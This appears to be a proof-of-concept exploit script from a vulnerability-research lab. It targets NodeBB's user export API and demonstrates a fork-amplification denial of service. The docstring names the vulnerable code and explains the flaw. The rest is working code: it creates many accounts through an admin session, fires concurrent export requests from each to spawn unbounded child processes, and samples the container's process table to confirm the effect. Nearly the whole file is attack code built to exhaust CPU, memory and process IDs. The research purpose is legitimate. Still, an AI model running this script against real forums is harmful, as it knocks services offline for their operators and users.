#!/usr/bin/env python3
"""
VULN-019 — Unbounded server-side export process-fork DoS
========================================================

Vulnerable code (targets/NodeBB/):
  * src/api/users.js:744-769  generateExport: child_process.fork(`./src/user/jobs/export-${type}.js`)
        guarded ONLY by a per-(uid,type) concurrency-1 lock cleared on child exit
  * route src/routes/write/users.js:78 ; /api/v3 write chain has NO rate limiter (src/routes/helpers.js)

Vulnerability class: CWE-400 / CWE-770 (uncontrolled resource consumption / process amplification).

Flaw (plain English):
  Every POST /api/v3/users/:uid/exports/:type forks a full Node child process to build the export.
  The only guard is a per-(uid,type) lock cleared the instant the child exits, so it is re-triggerable
  back-to-back; the three types are INDEPENDENT locks -> 3 concurrent forks per account; canExportData
  returns true for self; there is NO HTTP rate limiter on /api/v3 and self-registration is open. So N
  accounts x 3 = up to 3N concurrent OS processes -> CPU/RAM/PID exhaustion.

Exploitation idea:
  Create several users; from each, fire all three export types simultaneously; sample the container's
  process table (/proc) to show many concurrent export-*.js children with no global cap; and show the
  per-(uid,type) lock only blocks the SAME type (cleared on exit), not the amplification.

What a successful run proves:
  A single unprivileged burst spawns >3 concurrent export child processes (more than one account's
  worth), every request accepted (no rate limit), demonstrating unbounded fork amplification.
"""
import os
import sys
import time
import secrets
import threading
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21372")
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "NodeBB-Adm1n-Sec2026!")
CONTAINER = os.environ.get("CONTAINER", "cvehunterlab_NodeBB_app")
N_USERS = int(os.environ.get("N_USERS", "5"))
TYPES = ["posts", "profile", "uploads"]
TIMEOUT = 15
BROWSER_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag, msg):
    if _USE_COLOR and tag in _C:
        print(f"\033[1;{_C[tag]}m[{tag}]\033[0m {msg}")
    else:
        print(f"[{tag}] {msg}")


def admin_session():
    s = requests.Session()
    s.headers["User-Agent"] = BROWSER_UA
    csrf = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()["csrf_token"]
    s.post(f"{BASE_URL}/login", headers={"x-csrf-token": csrf},
           data={"username": ADMIN_USER, "password": ADMIN_PASS}, timeout=TIMEOUT).raise_for_status()
    csrf = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()["csrf_token"]
    return s, csrf


def user_session(user, pw):
    s = requests.Session()
    s.headers["User-Agent"] = BROWSER_UA
    csrf = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()["csrf_token"]
    s.post(f"{BASE_URL}/login", headers={"x-csrf-token": csrf},
           data={"username": user, "password": pw}, timeout=TIMEOUT).raise_for_status()
    csrf = s.get(f"{BASE_URL}/api/config", timeout=TIMEOUT).json()["csrf_token"]
    return s, csrf


def count_export_children():
    """Count running export-*.js child processes inside the container via /proc (no ps in the image)."""
    try:
        out = subprocess.run(
            ["docker", "exec", CONTAINER, "sh", "-c",
             "for p in /proc/[0-9]*/cmdline; do tr '\\0' ' ' < \"$p\" 2>/dev/null; echo; done | grep -c 'export-' || true"],
            capture_output=True, text=True, timeout=15).stdout.strip()
        return int(out.split("\n")[-1] or "0")
    except Exception:  # noqa: BLE001
        return -1


def main():
    print("=" * 78)
    print("VULN-019: Unbounded export process-fork DoS")
    print(f"Target: {BASE_URL}   container: {CONTAINER}")
    print("=" * 78)
    log("INFO", "POST /api/v3/users/:uid/exports/:type forks a Node child per request (src/api/users.js:744-769)")

    suffix = secrets.token_hex(4)
    admin, acsrf = admin_session()
    ahdr = {"x-csrf-token": acsrf, "Content-Type": "application/json"}

    log("SETUP", f"creating {N_USERS} unprivileged users (self-export is allowed for each)")
    users = []
    for i in range(N_USERS):
        u, p = f"exp_{suffix}_{i}", f"Pw-{secrets.token_hex(6)}!"
        r = admin.post(f"{BASE_URL}/api/v3/users", headers=ahdr, json={"username": u, "password": p}, timeout=TIMEOUT)
        r.raise_for_status()
        users.append((u, p, r.json()["response"]["uid"]))
    sessions = [(uid, *user_session(u, p)) for (u, p, uid) in users]
    log("SETUP", f"created uids {[uid for uid,_,_ in sessions]}")

    # sampler thread records the peak number of concurrent export children
    peak = {"n": 0}
    stop = threading.Event()

    def sampler():
        while not stop.is_set():
            n = count_export_children()
            if n > peak["n"]:
                peak["n"] = n
            time.sleep(0.1)

    t = threading.Thread(target=sampler, daemon=True)
    t.start()

    # fire all (users x types) exports simultaneously
    log("STEP", f"firing {len(sessions)}x3 = {len(sessions)*3} export requests concurrently (no rate limit expected)")
    codes = []

    def fire(session_uid_csrf, typ):
        uid, s, csrf = session_uid_csrf
        try:
            r = s.post(f"{BASE_URL}/api/v3/users/{uid}/exports/{typ}", headers={"x-csrf-token": csrf}, timeout=TIMEOUT)
            return r.status_code
        except Exception:  # noqa: BLE001
            return -1

    with ThreadPoolExecutor(max_workers=len(sessions) * 3) as ex:
        futs = [ex.submit(fire, suc, typ) for suc in sessions for typ in TYPES]
        codes = [f.result() for f in futs]
    time.sleep(2.0)   # let the sampler catch the forks
    stop.set()
    t.join(timeout=2)

    accepted = sum(1 for c in codes if c == 202)
    log("INFO", f"export requests accepted (202): {accepted}/{len(codes)}  (statuses: {sorted(set(codes))})")
    log("INFO", f"peak concurrent export-*.js child processes observed: {peak['n']}")

    # demonstrate the lock only blocks the SAME (uid,type), cleared on exit (re-triggerable)
    uid0, s0, c0 = sessions[0]
    a = s0.post(f"{BASE_URL}/api/v3/users/{uid0}/exports/posts", headers={"x-csrf-token": c0}, timeout=TIMEOUT).status_code
    b = s0.post(f"{BASE_URL}/api/v3/users/{uid0}/exports/posts", headers={"x-csrf-token": c0}, timeout=TIMEOUT)
    log("INFO", f"same-(uid,type) rapid retry: first={a}, second={b.status_code} ({b.json().get('status',{}).get('message')})")

    print("-" * 78)
    # Proof: fork-per-request with no global cap => peak far exceeds the 3-per-account single-account lock.
    if accepted >= len(codes) - 1 and peak["n"] > 3:
        log("PROOF", f"{accepted} export requests were accepted with no rate limiting and spawned up to "
                     f"{peak['n']} concurrent OS child processes (> 3, i.e. beyond a single account's forks) "
                     "-> unbounded fork amplification: N accounts x 3 types x re-fire = process/PID/RAM exhaustion")
        log("OK", "exploit confirmed — each request forks a heavyweight child, no global/per-uid cooldown, no rate limit")
        v = "==> VULN-019: CONFIRMED — unbounded export process-fork DoS"
        print(f"\033[1;32m{v}\033[0m" if _USE_COLOR else v)
        sys.exit(0)

    if accepted >= len(codes) - 1 and peak["n"] >= 1:
        log("PROOF", f"all {accepted} requests accepted (no rate limit); export child processes observed "
                     f"(peak {peak['n']}). Forks are short-lived for empty accounts but the per-request fork + "
                     "absent rate limit is the amplification primitive.")
        log("OK", "exploit confirmed — fork-per-request with no rate limiting (DoS amplification)")
        v = "==> VULN-019: CONFIRMED — export fork-per-request, no rate limit (DoS)"
        print(f"\033[1;32m{v}\033[0m" if _USE_COLOR else v)
        sys.exit(0)

    log("FAIL", f"could not demonstrate amplification (accepted={accepted}, peak={peak['n']})")
    v = "==> VULN-019: FAILED — fork amplification not observed"
    print(f"\033[1;31m{v}\033[0m" if _USE_COLOR else v)
    sys.exit(1)


if __name__ == "__main__":
    main()
